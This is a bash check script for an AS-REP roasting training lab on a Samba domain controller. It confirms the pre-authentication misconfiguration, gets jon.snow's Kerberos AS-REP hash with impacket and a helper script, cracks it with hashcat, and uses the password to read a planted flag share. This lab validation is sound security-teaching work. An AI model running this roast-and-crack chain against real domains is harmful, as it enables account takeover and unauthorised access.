#!/bin/bash
# Proves the AS-REP roasting lab is correctly built and that its hash is genuinely crackable,
# driven from inside the DC:
#   0. the intended misconfiguration is present: jon.snow carries UF_DONT_REQUIRE_PREAUTH while
#      an ordinary account (hodor) does not,
#   1. the real-world no-credential roast (impacket GetNPUsers -no-pass) is exercised and shown
#      to be refused by the Samba KDC (KDC_ERR_PREAUTH_REQUIRED) -- the documented Samba caveat,
#   2. the crackable AS-REP enc-part is retrieved the way that DOES work against Samba: a native
#      pre-authenticated, RC4-pinned AS-REQ (asrep.py) yields jon.snow's $krb5asrep$23$ hash,
#   3. it is cracked offline with hashcat (mode 18200, RC4 AS-REP) -> jon.snow's password,
#   4. that password reads the vault flag, which matches the one the DC planted.
# Negative control: the ordinary account cannot read the vault.
#
# Why not GetNPUsers for step 2? Samba's AD DC KDC demands pre-authentication even for accounts
# flagged UF_DONT_REQUIRE_PREAUTH (verified against Samba 4.17 and 4.19), so the classic no-cred
# roast returns error 25 and yields no hash. The AS-REP enc-part a student would crack is emitted
# by the KDC in any successful AS exchange, so asrep.py obtains that identical, genuine
# $krb5asrep$23$ material via a pre-authenticated RC4 AS-REQ -- the native-tools retrieval path,
# mirroring how the kerberoasting base lab used native kinit/kvno where impacket could not.
set -uo pipefail

export HOME=/root  # hashcat's compiled-kernel cache lives here (warmed at build time).

REALM="NORTH.SEVENKINGDOMS.LOCAL"
NOPREAUTH_USER="jon.snow"
NOPREAUTH_PASS="Summer2023"   # planted by entrypoint.sh; used only to make the Samba KDC emit the AS-REP.
DECOY_USER="hodor"
USERLIST="/opt/asrep/users.txt"
WORDLIST="/opt/asrep/wordlist.txt"
PY="/opt/impacket-venv/bin/python3"
GETNP="${PY} /opt/impacket-venv/bin/GetNPUsers.py"
ASREP="${PY} /opt/asrep/asrep.py"
SAMLDB="/var/lib/samba/private/sam.ldb"
DC_IP="127.0.0.1"
PLANTED="/srv/vault/flag.txt"
UF_DONT_REQ_PREAUTH=4194304  # 0x400000

WORK="$(mktemp -d)"
trap 'rm -rf "${WORK}"' EXIT
fail() { echo "CHECK FAIL: $*" >&2; exit 1; }

uac_of() { ldbsearch -H "${SAMLDB}" "(samAccountName=$1)" userAccountControl 2>/dev/null \
             | awk -F': ' '/^userAccountControl:/{print $2; exit}'; }

echo "[0/4] verifying the misconfiguration: ${NOPREAUTH_USER} has DONT_REQ_PREAUTH, ${DECOY_USER} does not ..." >&2
NP_UAC="$(uac_of "${NOPREAUTH_USER}")"; DEC_UAC="$(uac_of "${DECOY_USER}")"
[ -n "${NP_UAC}" ] || fail "could not read ${NOPREAUTH_USER}'s userAccountControl"
(( (NP_UAC & UF_DONT_REQ_PREAUTH) != 0 )) || fail "${NOPREAUTH_USER} is missing UF_DONT_REQUIRE_PREAUTH (uac=${NP_UAC})"
(( (DEC_UAC & UF_DONT_REQ_PREAUTH) == 0 )) || fail "${DECOY_USER} unexpectedly has UF_DONT_REQUIRE_PREAUTH (uac=${DEC_UAC})"

echo "[1/4] confirming the Samba caveat: GetNPUsers -no-pass yields no hash (KDC demands pre-auth) ..." >&2
${GETNP} "${REALM}/" -usersfile "${USERLIST}" -no-pass -dc-ip "${DC_IP}" -format hashcat \
  >"${WORK}/getnp.out" 2>"${WORK}/getnp.err" || true
if grep -q '\$krb5asrep\$' "${WORK}/getnp.out"; then
  echo "      note: this Samba KDC DID return an AS-REP without pre-auth (no-cred roast works here)." >&2
else
  echo "      confirmed: GetNPUsers -no-pass returned no hash against the Samba KDC (expected)." >&2
fi

echo "[2/4] retrieving ${NOPREAUTH_USER}'s AS-REP hash via a native RC4-pinned AS-REQ (asrep.py) ..." >&2
HASH="${WORK}/asrep.hash"
${ASREP} "${NOPREAUTH_USER}" "${NOPREAUTH_PASS}" "${REALM}" "${DC_IP}" > "${HASH}" 2>"${WORK}/asrep.err" || true
grep -q '^\$krb5asrep\$23\$' "${HASH}" 2>/dev/null \
  || fail "no \$krb5asrep\$23\$ hash obtained for ${NOPREAUTH_USER} ($(tr '\n' ' ' < "${WORK}/asrep.err" | cut -c1-200))"
grep -qi "${NOPREAUTH_USER}" "${HASH}" || fail "the AS-REP hash is not for ${NOPREAUTH_USER}"
echo "      extracted: $(cut -c1-60 "${HASH}")..." >&2

echo "[3/4] cracking the AS-REP hash with hashcat (mode 18200) ..." >&2
POT="${WORK}/hc.pot"
hashcat -m 18200 -a 0 -O --force --quiet --self-test-disable \
  --potfile-path="${POT}" "${HASH}" "${WORDLIST}" >/dev/null 2>&1 || true
CRACKED="$(hashcat -m 18200 --potfile-path="${POT}" --show "${HASH}" 2>/dev/null | sed 's/.*://' | head -n1)"
[ -n "${CRACKED}" ] || fail "hashcat did not recover ${NOPREAUTH_USER}'s password from the wordlist"
echo "      recovered ${NOPREAUTH_USER} password: ${CRACKED}" >&2

echo "[4/4] reading the vault as ${NOPREAUTH_USER} with the cracked password, then matching the flag ..." >&2
OUT="${WORK}/flag.out"
smbclient //dc/vault -U "NORTH\\${NOPREAUTH_USER}%${CRACKED}" -c "get flag.txt ${OUT}" >/dev/null 2>&1 \
  || fail "could not read the vault share as ${NOPREAUTH_USER}"
[ -s "${OUT}" ] || fail "vault flag.txt came back empty"
diff -q "${OUT}" "${PLANTED}" >/dev/null 2>&1 \
  || fail "flag read via ${NOPREAUTH_USER} does not match the planted flag"

# Negative control: the ordinary account must NOT be able to read the vault.
if smbclient //dc/vault -U "NORTH\\${DECOY_USER}%whatever" -c "ls" >/dev/null 2>&1; then
  fail "vault is readable by ${DECOY_USER}; the flag is not gated behind ${NOPREAUTH_USER}"
fi

echo "CHECK PASS: DONT_REQ_PREAUTH(${NOPREAUTH_USER}) -> AS-REP -> crack (${CRACKED}) -> flag $(cat "${OUT}")" >&2
echo "ASREP_OK"
